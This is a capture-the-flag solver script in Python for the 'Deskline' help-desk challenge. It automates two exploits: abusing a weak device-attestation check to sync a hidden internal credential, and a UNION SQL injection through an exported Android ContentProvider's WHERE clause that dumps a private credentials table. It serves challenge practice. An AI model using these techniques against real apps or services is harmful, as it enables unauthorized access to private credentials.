#!/usr/bin/env python3
"""
Deskline "Help Yourself" CTF solver.

Two ways to reach the agent-only note (the flag):

  API mode (default, no Android device required)
    The backend syncs every ticket queue plus one *internal* credential to the
    app. The credential is stored in the app's `credentials` table and is never
    rendered by the UI, but it is handed out by /api/v1/sync to any client that
    can pass the weak attestation check.

  ADB mode (--adb, intended mobile exploit)
    The app exports TicketProvider (authority com.deskline.tickets) and builds
    its SQL by concatenating the caller-supplied WHERE clause. That is a SQL
    injection, which lets other apps UNION the private `credentials` table into
    the ticket cursor and read the note.

Usage:
    python3 solve.py                       # API mode
    python3 solve.py --adb                 # via exported ContentProvider (needs adb)
    python3 solve.py --url http://host:port
"""

import argparse
import json
import re
import subprocess
import sys
import urllib.error
import urllib.request
import uuid

DEFAULT_URL = "https://web-0129ca0487b6079e.web.h7tex.com"
CLIENT_HEADER = "Deskline-Android/1.6.0"
FLAG_RE = re.compile(r"H7CTF\{[^}]+\}")


def http(url, method="GET", body=None, headers=None, timeout=15):
    data = body.encode("utf-8") if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def get_token(base):
    """Register a throwaway device and exchange it for a bearer token."""
    device_id = "dsk-" + str(uuid.uuid4())
    status, text = http(
        f"{base}/api/v1/auth/device",
        method="POST",
        body=json.dumps({"device_id": device_id}),
        headers={
            "Content-Type": "application/json",
            "X-Deskline-Client": CLIENT_HEADER,
        },
    )
    print(f"[*] auth/device -> HTTP {status} (device_id={device_id})")
    if status != 200:
        sys.exit(f"[!] device auth failed: {text}")
    payload = json.loads(text)
    print(f"[*] authenticated as agent: {payload.get('agent')}")
    return payload["token"]


def solve_api(base):
    token = get_token(base)
    status, text = http(
        f"{base}/api/v1/sync",
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"[*] /api/v1/sync -> HTTP {status}")
    if status != 200:
        sys.exit(f"[!] sync failed: {text}")

    data = json.loads(text)
    print("\n[*] Ticket queue (what the UI shows):")
    for ticket in data.get("tickets", []):
        print(f"    - {ticket['subject']}: {ticket['body']}")

    internal = data.get("internal") or {}
    print(f"\n[+] Agent-only note ({internal.get('label', 'internal')}):")
    print(f"    {internal.get('value')}")

    match = FLAG_RE.search(text)
    if not match:
        sys.exit("[!] no flag found in sync response")
    return match.group(0)


def solve_adb(uri="content://com.deskline.tickets/"):
    """Intended mobile exploit: SQLi in the exported provider's WHERE clause."""
    selection = "1=1 UNION SELECT 1,label,value FROM credentials"
    cmd = ["adb", "shell", "content", "query", "--uri", uri, "--where", selection]
    print("[*] running:", " ".join(cmd))
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout
    except FileNotFoundError:
        sys.exit("[!] adb not found; wire up a device/emulator or use API mode")
    print(out)
    match = FLAG_RE.search(out)
    if not match:
        sys.exit("[!] no flag in provider output")
    return match.group(0)


def main():
    parser = argparse.ArgumentParser(description="Deskline CTF solver")
    parser.add_argument("--url", default=DEFAULT_URL, help="backend base URL")
    parser.add_argument(
        "--adb",
        action="store_true",
        help="exploit the exported TicketProvider instead of the REST API",
    )
    parser.add_argument(
        "--uri",
        default="content://com.deskline.tickets/",
        help="provider URI for --adb mode",
    )
    args = parser.parse_args()

    base = args.url.rstrip("/")
    print(f"[*] target: {base}\n")
    flag = solve_adb(args.uri) if args.adb else solve_api(base)
    print(f"\n[=] FLAG: {flag}")


if __name__ == "__main__":
    main()
